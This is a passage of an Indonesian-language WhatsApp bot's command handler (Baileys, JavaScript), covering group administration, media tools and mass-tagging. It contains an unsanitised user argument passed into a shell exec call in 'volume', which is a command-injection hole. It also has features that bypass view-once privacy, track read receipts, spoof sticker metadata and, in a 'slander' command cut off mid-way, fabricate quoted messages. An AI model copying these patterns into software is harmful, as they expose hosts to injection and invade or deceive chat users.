           pemuda.sendMessage(from, await getBuffer(pic), image, {quoted: ftroli, caption: ingfo, sendEphemeral: true, contextInfo: {"mentionedJid": [groupMetadata.owner.replace('@c.us', '@s.whatsapp.net')]}})

           break

case 'lolkey':  
           //if (!isRegister) return freply(mess.only.regis)                 
           if (args.length < 1) return freply(`Caranya ${prefix + command} apikey`) 
           anu = await fetchJson(`https://api.lolhuman.xyz/api/checkapikey?apikey=$q}`)
           teks = `*──「 YOUR APIKEY 」──*
              
*Username : ${anu.result.username}*
*Request : ${anu.result.requests}*
*Today :${anu.result.today}*
*Akun Type : ${anu.result.account_type}*
*Expired : ${anu.result.expired}*

*Website Apikey*
https://lolhuman.herokuapp.com`
           pemuda.sendMessage(from, teks, text, {quoted: ftroli})
           break

     case 'me':
     case 'profile':     
            profile = `*──「 USER INFO 」──*
              
*Nama :* ${pushname} 
*Status :* ${isOwner ? 'Owner' : isPremium ? 'Premium' : 'Gratisan'}
*Rank :* ${role}
*Level :* ${userLevel}
*Exp :* ${userXp} Exp
*Limit :* 50 Limit
*Limit Game :* 50 Limit
*Balance :* Rp.${getBalance(sender, balance)}`
           sendButMessage(from, `${profile}`, `Powered By Project Pemuda`, [{buttonId: `${prefix}menu`,buttonText: {displayText: `MENU`},type: 1}])     
           break                         
case 'demote':
           if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return freply('Admin Group Only')
           if (!isGroup) return
           if (!isBotGroupAdmins) return freply('Bot bukan admin kak')
           if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return freply('Reply members')
           mentionede = mek.message.extendedTextMessage.contextInfo.participant
           pemuda.groupDemoteAdmin(from, [mentionede])
           teks = `Members @${mentionede.split('@')[0]} succes demote`
           pemuda.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid:[mentionede]}})
           break
case 'promote':
           if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return freply('Admin Group Only')
           if (!isGroup) return
           if (!isBotGroupAdmins) return freply('Bot bukan admin kak')
           if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return freply('Reply members')
           mentionede = mek.message.extendedTextMessage.contextInfo.participant
           pemuda.groupMakeAdmin(from, [mentionede])
           teks = `Members @${mentionede.split('@')[0]} succes promote`
           pemuda.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid:[mentionede]}})
           break
case 'demoteall':
           if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return freply('Admin Group Only')
           if (!isGroup) return
           if (!isBotGroupAdmins) return freply('Bot bukan admin kak')
           members_id = []
		   for (let mem of groupMembers) {
     	   members_id.push(mem.jid)
}
           pemuda.groupDemoteAdmin(from, members_id)
           break
case 'promoteall':
           if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return freply('Admin Group Only')
           if (!isGroup) return
           if (!isBotGroupAdmins) return freply('Bot bukan admin kak')
           members_id = []
		   for (let mem of groupMembers) {
	       members_id.push(mem.jid)
}
           pemuda.groupMakeAdmin(from, members_id)
           break           
case 'revoke':
           if (!mek.key.fromMe && !isOwner && !isGroupAdmins) return freply('Admin Group Only')
           if (!isBotGroupAdmins) return freply('Bot bukan admin kak')
           if (!isGroup) return
           pemuda.revokeInvite(from)
           freply('```Succes revoke link group```')
           break
case 'linkgc':
case 'linkgrup':
case 'linkgrop':
case 'linkgroup':
           if (!isGroup) return
           //if (!isRegister) return freply(mess.only.regis)           
           if (!isBotGroupAdmins) return freply('Bot bukan admin kak')
           linkgc = await pemuda.groupInviteCode(from)
           yeh = `https://chat.whatsapp.com/${linkgc}`
           pemuda.sendMessage(from, yeh, text, { quoted: mek })
           break
case 'kick':
           if (!isGroupAdmins && !isOwner &&  !mek.key.fromMe)return freply(mess.only.admins)
           if (!mek.key.fromMe && !isGroup) return freply(mess.only.gruoup)
           kick(from, mentionUser)
           break                                 
case 'add':
           if (!isGroup) return      
           if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return freply('Admin Group Only')
           if (!isBotGroupAdmins) return freply('Bot bukan admin kak')      
           if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
           entah = arg.split("|")[0]
           entah = entah.replace(new RegExp("[()+-/ +/]", "gi"), "")
           entah = `${entah}@s.whatsapp.net`
           pemuda.groupAdd(from, [entah])
           } else {
           entah = mek.message.extendedTextMessage.contextInfo.participant
           pemuda.groupAdd(from, [entah])
           }
           break 
case 'undang':
           if (!isGroup) return      
           if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return freply('Admin Group Only')
           if (!isBotGroupAdmins) return freply('Bot bukan admin kak')      
           ganteng = args.join(' ')
           add = await pemuda.groupAdd(from, [`${ganteng}@s.whatsapp.net`])
           nomer = Object.keys(add.participants[0])[0]
           invitkode = add.participants[0][nomer].invite_code
           invitkodeexp = add.participants[0][nomer].invite_code_exp
           ppgcc = await pemuda.getProfilePicture(from)
           ppgc = await getBuffer(ppgcc)
           let undangan = await pemuda.prepareMessageFromContent(Object.keys(add.participants[0])[0].replace('c.us', 's.whatsapp.net'), {
           "groupInviteMessage": {      
           "groupJid": from,      
           "inviteCode": invitkode,      
           "inviteExpiration": invitkodeexp,      
           "groupName": groupName,
           "caption": `@${botNumberss.split("@")[0]} Mengundang Untuk Bergabung Ke Grup WhatsApp\n\nBy ${botName}`}}, {thumbnail: ppgc, contextInfo: {"mentionedJid": [botNumberss]}})
           pemuda.relayWAMessage(undangan)
           break                                          
           
case 'getp':
//if (!isRegister) return freply(mess.only.regis)
try {
pic = await pemuda.getProfilePicture(from)
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
thumb = await getBuffer(pic)
pemuda.sendMessage(from, thumb, MessageType.image, {quoted: mek, caption: "Nih kak..."})
break
case 'getpic':
//if (!isRegister) return freply(mess.only.regis)
if (mek.message.extendedTextMessage != undefined){
mentioned = mek.message.extendedTextMessage.contextInfo.participant
try {
pic = await pemuda.getProfilePicture(mentioned)
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
thumb = await getBuffer(pic)
pemuda.sendMessage(from, thumb, MessageType.image, {quoted: mek, caption: "Nih kak..."})
} else if (args[0]) {
try {
pic = await pemuda.getProfilePicture(args[0])
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
thumb = await getBuffer(pic)
pemuda.sendMessage(from, thumb, MessageType.image, {quoted: mek, caption: "Nih kak..."})
} else {
freply(`Example :\n${prefix}${command} 62xxx\n${prefix}${command} <reply>`)
}
break
case 'getbio':
//if (!isRegister) return freply(mess.only.regis)
var yy = mek.message.extendedTextMessage.contextInfo.participant
var p = await pemuda.getStatus(`${yy}`, MessageType.text)
freply(p.status)
if (p.status == 401) {
freply("Status Profile Not Found")
}
break
case 'getname':
//if (!isRegister) return freply(mess.only.regis)
var ambl = mek.message.extendedTextMessage.contextInfo.participant
const sname = pemuda.contacts[ambl] != undefined ? pemuda.contacts[ambl].sname || pemuda.contacts[ambl].notify : undefined
freply(sname)
break           
                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                                                                                                                                                                                                        
//<------------------< Belom gw rapihin >---------------->
case 'toviewonce': 
case 'toonce':
            try{
            if (!isQuotedImage)return reply('Reply image')
            const viewonce = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            oneclick = await pemuda.downloadMediaMessage(viewonce)
            pemuda.sendMessage(from, oneclick, image,{quoted: fgif ,viewOnce : true}) 
            } catch {
            reply('Reply Image')
            }
            break
case 'readviewonce':
            //var msg = {...mek}
            msg.message = mek.message.extendedTextMessage.contextInfo.quotedMessage.viewOnceMessage.message
            msg.message[Object.keys(msg.message)[0]].viewOnce = false
            pemuda.copyNForward(from, msg)
            break
case 'd':
case 'del':
case 'delete':
           try {
           if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return freply('Reply chat bot')
           pemuda.deleteMessage(from, {id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true})
           } catch (e){
           freply('Reply chat bot')
           }
           break
case 'size':
           //if (!isRegister) return freply(mess.only.regis)
           if (args.length < 1) return freply('Masukan angkanya')
           filsize = args[0]
           costick = await pemuda.prepareMessageFromContent(from,{
           "stickerMessage": {
           "url": m.quoted.url,
           "fileSha256": m.quoted.fileSha256.toString('base64'),
           "fileEncSha256": m.quoted.fileEncSha256.toString('base64'),
           "mediaKey": m.quoted.mediaKey.toString('base64'),
           "mimetype": m.quoted.mimetype,
           "height": m.quoted.height,
           "width": m.quoted.width,
           "directPath": m.quoted.directPath,
           "fileLength": filsize,
           "mediaKeyTimestamp": m.quoted.mediaKeyTimestamp.low,
           "isAnimated": m.quoted.isAnimated
           }
           }, {quoted:mek})
           pemuda.relayWAMessage(costick)
           break
case 'volume':
           //if (!isRegister) return freply(mess.only.regis)
           if (!isQuotedAudio) return freply('Reply audio!')
           encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
           media = await pemuda.downloadAndSaveMediaMessage(encmedia)
           rname = getRandom('.mp3')
           exec(`ffmpeg -i ${media} -filter:a "volume=${args[0]}" ${rname}`, (err, stderr, stdout) => {
           fs.unlinkSync(media)
           if (err) return freply('Error!')
           jadie = fs.readFileSync(rname)
           pemuda.sendMessage(from, jadie, audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek})
           fs.unlinkSync(rname)
           })
           break
case 'fliptext':
           //if (!isRegister) return freply(mess.only.regis)
           if (args.length < 1) return freply(`Example:\n${prefix}fliptext MyMans`)
           quere = args.join(" ")
           flipe = quere.split('').reverse().join('')
           freply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
           break
case 'tohuruf':
           //if (!isRegister) return freply(mess.only.regis)
           if (!Number(args[0])) return freply(`Example:\n${prefix}tohuruf 456`)
           try {
           quere = args.join(" ")
           convertes = await toHur(quere)
           freply(`\`\`\`「 ALPHABET 」\`\`\`\n*•> Number :*\n${quere}\n*•> Alphabet :*\n${convertes}`)
           } catch {
           freply(mess.error.api)
           }
           break
case 'blocklist':
           //if (!isRegister) return freply(mess.only.regis)
           let blockede = pemuda.blocklist.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').filter(v => v != pemuda.user.jid)
           pemuda.freply(m.chat, `┌「 *List Blockir* 」` + `\n` + blockede.map((v, i) => `│ ${i + 1}. @${v.split`@`[0]}`).join`\n` + `\n└────`, m, { contextInfo: { mentionedJid: blocked } })
           break
case 'detikvn':
           //if (!isRegister) return freply(mess.only.regis)
           encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		   mediam = await pemuda.downloadAndSaveMediaMessage(encmediam)
		   cokmatane = Number(args[0])
		   hah = fs.readFileSync(mediam)
		   pemuda.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
	 	   fs.unlinkSync(mediam)
		   break
case 'detikvideo':
           //if (!isRegister) return freply(mess.only.regis)				
		   encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		   median = await pemuda.downloadAndSaveMediaMessage(encmedian)
		   cokmatane = Number(args[0])
	       hah = fs.readFileSync(median)
		   pemuda.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
		   fs.unlinkSync(median)
		   break
           
case 'sider':
           //if (!isRegister) return freply(mess.only.regis)
           try {
           if (!isGroup) return freply('Hanya bisa didalam gruop')
           if (!isQuotedReply) return freply('Reply pesan botnya')      
           infom = await pemuda.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
           hemm = infom.reads
           hemms = infom.deliveries
           readon = hemms.map(v => v.jid)
           readdin = hemm.map(v => v.jid)
           stamp = hemm.map(v => v.t)      
           function toTime(UNIX_timestamp, ribuan){
           ribuan = (typeof ribuan == 'undefined') ? false : true;
           let a = new Date(UNIX_timestamp);
           if (ribuan) {
           a = new Date(UNIX_timestamp * 1000);
           } 	
           // ambil pecahan waktu masing-masing
           var hour = a.getHours();
           var min = a.getMinutes();
           var sec = a.getSeconds();
           // gabungkan ke dalam variable time
           var time = `${hour}:${min}:${sec}` ;
           return time;
           }
           function toBulan(UNIX_timestamp, ribuan){
           ribuan = (typeof ribuan == 'undefined') ? false : true;
           let a = new Date(UNIX_timestamp);
           if (ribuan) {
           a = new Date(UNIX_timestamp * 1000);
           } 
           //buat index bulan
           var months = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','Nopember','Desember'];
           var myDays = ['Minggu','Senin','Selasa','Rabu','Kamis','Jum at','Sabtu'];  
           // tanggal
           var day = a.getDate()
           bulanee = a.getMonth()
           var thisDay = a.getDay(),
           thisDay = myDays[thisDay];
           var yy = a.getYear()
           var year = (yy < 1000) ? yy + 1900 : yy;
           var bul = `${thisDay}, ${day} - ${months[bulanee]} - ${year}` ;
           return bul;
           }
           teksx = `「 *List Read Message* 」\n\n`
           for (let i of hemm) {
           teksx += `•> Nama : @${i.jid.split('@')[0]}\n•> Waktu : ${toTime(i.t, true)}\n•> Tanggal : ${toBulan(i.t, true)}\n\n`
           }
           teksx1 = `「 *List Deliveries To* 」\n\n`
           for (let i of hemms){
           teksx1 += `•> Nama : @${i.jid.split('@')[0]}\n`
           teksx1 += `•> Waktu : ${toTime(i.t, true)}\n•> Tanggal : ${toBulan(i.t, true)}\n\n`
           }
           pemuda.sendMessage(from, teksx, text, { sendEphemeral: true, quoted: mek, thumbnail: potofake, contextInfo: { forwardingScore:999, isForwarded:true, mentionedJid: readdin }})
           pemuda.sendMessage(from, teksx1, text, { sendEphemeral: true, quoted: mek, thumbnail: potofake, contextInfo: { forwardingScore:999, isForwarded:true, mentionedJid: readon }})
           } catch(e) {
           freply('reply pesan botnya goblok bukan pesan orang')
           freply(e)
           console.log(e)
           }
           break
 case 'tts':	    
	       asui = `𝗞𝗢𝗗𝗘 𝗕𝗔𝗛𝗔𝗦𝗔🌹
           
*~ 𝖤𝗑𝖺𝗆𝗉𝗅𝖾 : ${prefix}𝗍𝗍𝗌 𝗂𝖽 <𝗍𝖾𝗄𝗌>*

*“List Kode Bahasa”*
○ af = Afrikaans
○ sq = Albanian
○ ar = Arabic
○ hy = Armenian
○ ca = Catalan
○ zh = Chinese
○ zh-cn = Chinese (Mandarin/China)
○ zh-tw = Chinese (Mandarin/Taiwan)
○ zh-yue = Chinese (Cantonese)
○ hr = Croatian
○ cs = Czech
○ da = Danish
○ nl = Dutch
○ en = English
○ en-au = English (Australia)
○ en-uk = English (United Kingdom)
○ en-us = English (United States)
○ eo = Esperanto
○ fi = Finnish
○ fr = French
○ de = German
○ el = Greek
○ ht = Haitian Creole
○ hi = Hindi
○ hu = Hungarian
○ is = Icelandic
○ id = Indonesian
○ it = Italian
○ ja = Japanese
○ ko = Korean
○ la = Latin
○ lv = Latvian
○ mk = Macedonian
○ no = Norwegian
○ pl = Polish
○ pt = Portuguese
○ pt-br = Portuguese (Brazil)
○ ro = Romanian
○ ru = Russian
○ sr = Serbian
○ sk = Slovak
○ es = Spanish
○ es-es = Spanish (Spain)
○ es-us = Spanish (United States)
○ sw = Swahili
○ sv = Swedish
○ ta = Tamil
○ th = Thai
○ tr = Turkish
○ vi = Vietnamese
○ cy = Welsh`
		   if (args.length < 1) return sendButMessage(from, asui, `Powered By Project Pemuda`, [{buttonId: `hahajsjkaksbfkw`,buttonText:{displayText: 'PAHAMI KACK !'},type:1}], {contextInfo: { mentionedJid: [sender]}})
	       const gtts = require('./lib/gtts')(args[0])
	       if (args.length < 2) return pemuda.sendMessage(from, `Teksnya mana kak? contoh : ${prefix}tts id ChandraGanteng`, text, { quoted: mek })
		   var bby = body.slice(8)
		   ranm = getRandom('.mp3')
		   rano = getRandom('.ogg')
		   bby.length > 300 ? reply('Teks nya terlalu panjang kak') : gtts.save(ranm, bby, function () {
		   exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
		   fs.unlinkSync(ranm)
		   buff = fs.readFileSync(rano)
		   if (err) return reply(mess.error.api)
		   pemuda.sendMessage(from, buff, audio, { duration: 99999999999, ptt: true, quoted: mek })
	       fs.unlinkSync(rano)})})
		   break
case 'phy':
//if (!isRegister) return freply(mess.only.regis)
if (args.length < 1) return freply(`Example :\n${prefix}phy <name>`)
if (args[0] === 'glitch') {
if (args.length < 2) return freply(`Example :\n${prefix}phy glitch MyMans|Hacker 404`)
var cv = body.slice(12)
var quer = cv.split("|")[0];
var quer1 = cv.split("|")[1];
freply(mess.wait)
ph.pGlitch(quer, quer1).then(res => {
sendMediaURL(from, `${res.url}`, 'Dah jadi ngab')
})
} else if (args[0] === 'coffecup') {
if (args.length < 2) return freply(`Example :\n${prefix}phy coffecup MyMans`)
anu = body.slice(14)
freply(mess.wait)
ph.pCoffeCup(anu).then(res => {
sendMediaURL(from, `${res.url}`, 'Dah jadi ngab')
})
} else if (args[0] === 'shadow') {
if (args.length < 2) return freply(`Example :\n${prefix}phy shadow MyMans`)
anu = body.slice(12)
freply(mess.wait)
ph.pShadow(anu).then(res => {
sendMediaURL(from, `${res.url}`, 'Dah jadi ngab')
})
} else if (args[0] === 'neon') {
if (args.length < 2) return freply(`Example :\n${prefix}phy neon MyMans`)
anu = body.slice(9)
freply(mess.wait)
ph.pNeons(anu).then(res => {
sendMediaURL(from, `${res.url}`, 'Dah jadi ngab')
})
} else if (args[0] === 'wanted') {
if (args.length < 2) return freply(`Example :\n${prefix}phy wanted https://telegra.ph/file/af4038f3cd8db3831aa28.jpg|MyMans|Hacker 404`)
var cv = body.slice(12)
var uri = cv.split("|")[0];
var quer = cv.split("|")[1];
var quer1 = cv.split("|")[2];
freply(mess.wait)
ph.pWanted(uri, quer, quer1).then(res => {
sendMediaURL(from, `${res.url}`, 'Dah jadi ngab')
})
} else {
freply(`*List Photooxy :*\n•> glitch\n•> coffecup\n•> shadow\n•> wanted\n•> neon`)
}
break
case 'pvp':
if (!mek.key.fromMe && !isOwner) return
tapib1 = fs.readFileSync('./media/audio/numayei.mp3')
pemuda.sendMessage(from, tapib1, document, { quoted: mek, filename:`CHANDRA ${ngazap}.mp3`, mimetype: 'audio/application' })
await freply('Bang mau nanya')
break
case 'playstore':
//if (!isRegister) return freply(mess.only.regis)
if (args.length < 1) return freply(`Example :\n${prefix}playstore termux`)
quer = args.join(" ")
hx.playstore(quer).then(res => {
teks = '```「 Play Store 」```'
for (let i of res) {
teks += `\n\n${i.name}\n`
teks += `${i.link}\n`
teks += `${i.developer}`
}
freply(teks)
})
break
case 'searchgc':
//if (!isRegister) return freply(mess.only.regis)
if (args.length < 1) return freply(`Example :\n${prefix}searchgc Editor Berkelas`)
nae = args.join(" ")
hx.linkwa(nae).then(res => {
teks = '```「 Search Group 」```'
for (let i of res) {
teks += `\n\n•> Group Whatsapp :\n`
teks += `${i.link}\n`
teks += `${i.nama}`
}
freply(teks)
})
break
case 'surah':
if (!mek.key.fromMe && !isOwner) return
if (args.length < 1) return freply(`Example :\n${prefix}surah 1`)
srh = args[0]
hx.surah(srh).then(res => {
teks = '```「 AL-QURAN 」```\n\n_Lebih baik baca di al-qurannya langsung biar berkah, kalo dihp gk berkah_\n\n'
for (let i of res) {
teks += '*•> Arab :* ' + i.arab + '\n'
teks += '*•> Indo :* ' + i.indo + '\n'
teks += '*•> Latin :* ' + i.latin + '\n\n'
}
freply(teks)
})
break
case 'styletext':
//if (!isRegister) return freply(mess.only.regis)
if (args.length < 1) return freply('Enter The Text')
async function stylizeText(text) {
let res = await fetch('http://qaz.wtf/u/convert.cgi?text=' + encodeURIComponent(text))
let html = await res.text()
let dom = new JSDOM(html)
let table = dom.window.document.querySelector('table').children[0].children
let obj = {}
for (let tr of table) {
let name = tr.querySelector('.aname').innerHTML
let content = tr.children[1].textContent.replace(/^\n/, '').replace(/\n$/, '')
obj[name + (obj[name] ? ' Reversed' : '')] = content
}
return obj
}
matext = args.join(" ")
let fetch = require('node-fetch')
let { JSDOM } = require('jsdom')
pemuda.freply(m.chat, Object.entries(await stylizeText(matext)).map(([name, value]) => `\`\`\`「 ${name} 」\`\`\`\n\n${value}\n\n—————————————————————————`).join`\n\n`, m)
break
case 'tag':
//if (!isRegister) return freply(mess.only.regis)
noes = `${args[0]}@s.whatsapp.net`
beks = `@${noes.split("@")[0]}`
pemuda.sendMessage(from, beks, text, {quoted:mek, contextInfo:{mentionedJid:[noes]}})                
break
case 'q': 
//if (!isRegister) return freply(mess.only.regis)
if (!m.quoted) return freply('reply message!')
let qse = pemuda.serializeM(await m.getQuotedObj())
if (!qse.quoted) return freply('the message you replied does not contain a reply!')
await qse.quoted.copyNForward(m.chat, true)
break
case 'hbd': 
//if (!isRegister) return freply(mess.only.regis)
let textus = args.join(" ")
if (!q) return freply(`Example:\n 2002 02 25`)
const zodiak = [
    ["Capricorn", new Date(1970, 0, 1)],
    ["Aquarius", new Date(1970, 0, 20)],
    ["Pisces", new Date(1970, 1, 19)],
    ["Aries", new Date(1970, 2, 21)],
    ["Taurus", new Date(1970, 3, 21)],
    ["Gemini", new Date(1970, 4, 21)],
    ["Cancer", new Date(1970, 5, 22)],
    ["Leo", new Date(1970, 6, 23)],
    ["Virgo", new Date(1970, 7, 23)],
    ["Libra", new Date(1970, 8, 23)],
    ["Scorpio", new Date(1970, 9, 23)],
    ["Sagittarius", new Date(1970, 10, 22)],
    ["Capricorn", new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
    let d = new Date(1970, month - 1, day)
    return zodiak.find(([_,_d]) => d >= _d)[0]
}
    const date = new Date(textus)
    if (date == 'Invalid Date') throw date
    const d = new Date()
    const [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
    const birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
    
    const zodiac = getZodiac(birth[1], birth[2])
    const ageD = new Date(d - date)
    const age = ageD.getFullYear() - new Date(1970, 0, 1).getFullYear()

    const birthday = [tahun + (birth[1] < bulan), ...birth.slice(1)]
    const cekusia = bulan === birth[1] && tanggal === birth[2] ? `Happy -${age}th Birthday 🥳🎉` : age

    const teksh = `
Birth : ${birth.join('-')}
Upcoming hbd : ${birthday.join('-')}
Age : ${cekusia}
Zodiak : ${zodiac}
`.trim()
    m.freply(teksh)
           break
case 'listgroup':
case 'listgrup':
case 'listgrop':
case 'gruplist':
case 'groplist':
case 'grouplist':
           //if (!isRegister) return freply(mess.only.regis)
           const txs = pemuda.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`•> ${pemuda.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`\n~~\n`
           pemuda.sendMessage(m.chat, '```「 List Groups 」```\n\n' + txs, text)
           break
case 'searchtext':
           //if (!isRegister) return freply(mess.only.regis)
           if (args.length < 1) return freply(`${a}Wrong Format${a} What Message Are You Looking For Bro??\Example : ${prefix}searchtext halo|10`)
           tekse = args.join('')
           if (tekse.includes("|")) { 
           try {
           var ve = tekse.split("|")[0]
           var za = tekse.split("|")[1]
           if (za > 15) return freply('minimum 15')
           sampai = `${za}`
           batas = parseInt(sampai) + 1
           cok = await pemuda.searchMessages(`${ve}`, from, batas,1) 
           if (cok.messages.lenght < 2) return freply('Message Not Found') 
           if (cok.messages.length < parseInt(batas)) freply(`Found Only ${cok.messages.length - 1} Messages`)
           for (let i=1;i < cok.messages.length;i++) {
           if (cok.messages[i].message) {
           pemuda.sendMessage(from, `Here The Message!`, text, {quoted: cok.messages[i]}) 
           }
           }
           } catch(e) {
           console.log(e)
           return freply(`${a}ERROR${a} An error occurred while searching for Messages`)
           }
           } else {
           freply(`Wrong format, this is an example of the correct format : ${prefix}searchtext halo|15`)
           }
           break
case 'status':
case 'mystat':
case 'botstat': 
           //if (!isRegister) return freply(mess.only.regis)          
           memu = `*──「 STATUS BOT 」──*
           
*Base : MhankBarBar*
*Recode : CHANDRA*
*Lib : Baileys*
*Prefix : ${prefix}*
*Versi Baileys : 3.5.2*
*Merk HP : ${device_manufacturer}*
*Versi OS : ${os_version}*
*Versi HP : ${device_model}*
*MCC : ${mcc}*
*MNC : ${mnc}*
*Baterai : ${baterai}%*
*Whatsapp : ${wa_version}*
*Blockir : ${blocked.length} Blocked*
*Group Chat : ${totalgroup.length} Chat*
*Personal Chat : ${totalkontak.length} Chat*
*Total Chat : ${totalchat.length} Chat*
*Speed : ${latensi.toFixed(4)} Secconds*

*Info Lebih Lengkap?? Bisa Chat Owner Kack☕✨*`
            freply(memu)
            break
    case 'get':
            //if (!isRegister) return freply(mess.only.regis)    
            if(!q) return freply('linknya?')
            freply(mess.wait)
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            freply(bu)
            })   
            break
    case 'kontag':
            if (!mek.key.fromMe && !isOwner) return freply('SELF-BOT')
            pe = args.join('')
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return freply('Invalid phone number');
            members_ids = []
            for (let mem of groupMembers) {
            members_ids.push(mem.jid)
            }
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            pemuda.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
            break
    case 'sticktag':
            //if (!isRegister) return freply(mess.only.regis)    
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await pemuda.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await pemuda.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            pemuda.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else {
            freply(`*Reply sticker yang sudah dikirim*`)
            }
            break
    case 'totag':
            //if (!isRegister) return freply(mess.only.regis)    
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await pemuda.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await pemuda.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            pemuda.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await pemuda.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await pemuda.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            pemuda.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await pemuda.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await pemuda.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
          	mimetype : 'audio/mp4',
         	ptt : true,
            contextInfo: { mentionedJid: mem },
            quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            pemuda.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
            }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await pemuda.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await pemuda.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
         	mimetype : 'video/mp4',
            contextInfo: { mentionedJid: mem },
            quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            pemuda.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
            } else{
            freply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
            }
            break
    case 'slander':
            //if (!isRegister) return freply(mess.only.regis)    
            if (args.length < 1) return freply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
            var gh = args.join('')
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
            var replace = gh.split("|")[0];
            var target = gh.split("|")[1];
